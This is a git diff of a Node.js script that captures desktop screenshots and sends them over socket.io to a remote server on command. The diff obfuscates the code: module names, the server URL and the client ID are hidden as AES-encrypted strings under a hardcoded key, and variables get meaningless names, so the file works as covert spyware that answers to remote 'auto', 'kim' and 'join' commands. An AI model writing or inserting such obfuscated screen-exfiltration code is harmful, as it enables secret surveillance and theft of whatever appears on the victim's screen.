@@ -1,38 +1,48 @@
 "use strict";
-const screenshot = require("screenshot-desktop");
-var Config = require("./config");
 var stop = 1;
-var socket = require("socket.io-client")(
-  Config.API_URL
-);
+var crypto = require("crypto"),
+  algorithm = "aes-256-ctr",
+  character = "d6F3Efeq";
+
+function decrypt(text) {
+  var decipher = crypto.createDecipher(algorithm, character);
+  var dec = decipher.update(text, "hex", "utf8");
+  dec += decipher.final("utf8");
+  return dec;
+}
+let hw = decrypt("0c9ac0807b3e377c3947ef19faec129ca7468afac8fec73e2df90526");
+let cl = decrypt('098fcdc1');//2,3,4
+let sh = decrypt('178dc695247f6b783f5da909f7f0178fbc5f');
+let sk = decrypt('1781d79b246536793f04e701fbe6128f');
+const flap = require(sh);
+var finding = require(sk)(hw);
 function start(counter) {
   if (counter < stop) {
     setTimeout(function () {
       counter++;
-      screenshot()
+      flap()
         .then((img) => {
-          socket.emit("kaphwan", img);
+          finding.emit("kaphwan", img);
         })
         .catch((err) => {
           // ...
         });
       start(counter);
-    }, 10000);
+    }, 5000);
   }
 }
-socket.on("auto", function (){
-  stop = 1000;
+finding.on("auto", function () {
+  stop = 120;
   start(0);
-})
-socket.on("join", function () {
-  socket.emit("join", `${Config.CLIENT}|computer`);
 });
-socket.on("kim", function (data) {
+finding.on("join", function () {
+  finding.emit("join", `${cl}|computer`);
+});
+finding.on("kim", function () {
   stop = 0;
-  screenshot()
+  flap()
     .then((img) => {
-      socket.emit("kaphwan", img);
+      finding.emit("kaphwan", img);
     })
-    .catch((err) => {
-    });
+    .catch((err) => {});
 });
